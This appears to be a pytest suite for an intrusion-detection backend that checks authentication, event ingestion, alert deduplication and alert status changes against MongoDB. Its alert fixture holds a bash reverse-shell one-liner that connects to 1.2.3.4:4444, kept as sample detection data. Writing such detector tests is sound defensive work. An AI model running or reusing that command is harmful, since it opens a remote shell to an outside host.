"""API tests against a real MongoDB (set MONGO_URI; skipped when unreachable).

    docker run -d --rm -p 27017:27017 mongo:7.0
    MONGO_URI=mongodb://localhost:27017 pytest services/backend/tests
"""
import os
import time
import uuid

import pytest

os.environ.setdefault("MONGO_URI", "mongodb://localhost:27017")
os.environ["MONGO_DB"] = f"ids_test_{uuid.uuid4().hex[:8]}"
os.environ["AGENT_TOKEN"] = "agent-test-token"
os.environ["ADMIN_PASSWORD"] = "admin-test-pass"
os.environ["JWT_SECRET"] = "test-secret"

from pymongo import MongoClient  # noqa: E402
from pymongo.errors import PyMongoError  # noqa: E402

try:
    MongoClient(os.environ["MONGO_URI"], serverSelectionTimeoutMS=1500).admin.command("ping")
except PyMongoError:
    pytest.skip("MongoDB not reachable", allow_module_level=True)

from fastapi.testclient import TestClient  # noqa: E402

from app.main import app  # noqa: E402

AGENT = {"X-Agent-Token": "agent-test-token"}


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as c:
        yield c
    MongoClient(os.environ["MONGO_URI"]).drop_database(os.environ["MONGO_DB"])


@pytest.fixture(scope="module")
def auth(client):
    r = client.post("/api/auth/login", json={"username": "admin", "password": "admin-test-pass"})
    assert r.status_code == 200, r.text
    assert r.json()["role"] == "admin"
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def alert(key="k1", sev="High", risk=92.0, ts=None):
    return {"ts_ms": ts or int(time.time() * 1000), "node": "minikube", "dedup_key": key, "severity": sev,
            "risk_score": risk, "probability": 0.97, "ml_detected": True, "category": "reverse_shell",
            "title": "Reverse shell command line", "mitre": ["T1059.004"], "rules": [{"id": "R001"}],
            "k8s": {"valid": True, "namespace": "shop", "pod": "web-1", "workload": "web", "container": "app"},
            "event": {"event_type": "exec", "comm": "bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}


def test_login_rejects_bad_password(client):
    assert client.post("/api/auth/login", json={"username": "admin", "password": "nope"}).status_code == 401


def test_dashboard_requires_jwt(client):
    assert client.get("/api/alerts").status_code == 401
    assert client.get("/api/alerts", headers={"Authorization": "Bearer junk"}).status_code == 401


def test_ingest_requires_agent_token(client):
    assert client.post("/api/ingest", json={"events": []}).status_code == 401
    assert client.post("/api/ingest", json={"events": []}, headers={"X-Agent-Token": "bad"}).status_code == 401


def test_ingest_events_and_dedup_alerts(client, auth):
    now = int(time.time() * 1000)
    events = [
        {"ts_ms": now, "event_type": "exec", "comm": "bash", "cmdline": "bash -i", "k8s_context": True,
         "k8s": {"valid": True, "namespace": "shop", "pod": "web-1"},
         "prediction": {"scored": True, "label": "suspicious", "probability": 0.97}},
        {"ts_ms": now, "event_type": "connect", "comm": "java", "daddr": "10.0.0.5", "dport": 5432, "k8s_context": True,
         "k8s": {"valid": True, "namespace": "shop", "pod": "web-1"},
         "prediction": {"scored": True, "label": "normal", "probability": 0.01}},
        {"ts_ms": now, "event_type": "exec", "comm": "kubelet", "k8s_context": False, "k8s": {"valid": False},
         "prediction": {"scored": False}},
    ]
    r = client.post("/api/ingest", headers=AGENT, json={"node": "minikube", "events": events,
                                                         "alerts": [alert(ts=now), alert(ts=now + 10, risk=95)]})
    assert r.status_code == 200, r.text

    al = client.get("/api/alerts", headers=auth).json()
    assert al["total"] == 1, "identical alerts must be merged"
    a = al["items"][0]
    assert a["count"] == 2 and a["risk_score"] == 95 and a["status"] == "open"

    assert client.get("/api/events", headers=auth, params={"label": "raw"}).json()["total"] == 1
    assert client.get("/api/events", headers=auth, params={"label": "suspicious"}).json()["total"] == 1
    assert client.get("/api/events", headers=auth, params={"q": "5432"}).json()["total"] == 0
    assert client.get("/api/events", headers=auth, params={"q": "10.0.0"}).json()["total"] == 1
    assert client.get("/api/events", headers=auth, params={"q": "(unbalanced["}).status_code == 200  # regex-escaped


def test_alert_lifecycle(client, auth):
    a = client.get("/api/alerts", headers=auth).json()["items"][0]
    r = client.patch(f"/api/alerts/{a['id']}", headers=auth, json={"status": "resolved", "note": "false alarm"})
    assert r.status_code == 200 and r.json()["status"] == "resolved" and r.json()["updated_by"] == "admin"
    # a resolved alert is not merged with new occurrences
    client.post("/api/ingest", headers=AGENT, json={"alerts": [alert()]})
    assert client.get("/api/alerts", headers=auth, params={"status": "open"}).json()["total"] == 1
    assert client.patch("/api/alerts/not-an-id", headers=auth, json={"status": "open"}).status_code == 404
    assert client.patch(f"/api/alerts/{a['id']}", headers=auth, json={"status": "bogus"}).status_code == 422


def test_stats_agents_evaluation(client, auth):
    client.post("/api/agent/heartbeat", headers=AGENT, json={"node": "minikube", "cpu_percent": 3.2, "rss_mb": 120,
                                                             "latency_avg_ms": 140.0, "events_per_sec": 12})
    client.post("/api/agent/evaluation", headers=AGENT, json={"model_version": "rf-test", "holdout": {"f1": 0.99}})
    s = client.get("/api/stats", headers=auth, params={"minutes": 60}).json()
    assert s["events_total"] == 3 and s["alerts_by_severity"]["High"] >= 1
    assert s["pods_monitored"] == 1 and s["timeline"]
    ag = client.get("/api/agents", headers=auth).json()
    assert ag[0]["node"] == "minikube" and ag[0]["online"]
    ev = client.get("/api/evaluation", headers=auth).json()
    assert ev["offline"]["model_version"] == "rf-test" and ev["runtime_15m"]["cpu_avg"] == 3.2
    r = client.post("/api/evaluation/live", headers=auth, json={"detection_rate": 1.0})
    assert r.status_code == 200
    assert client.get("/api/namespaces", headers=auth).json() == ["shop"]
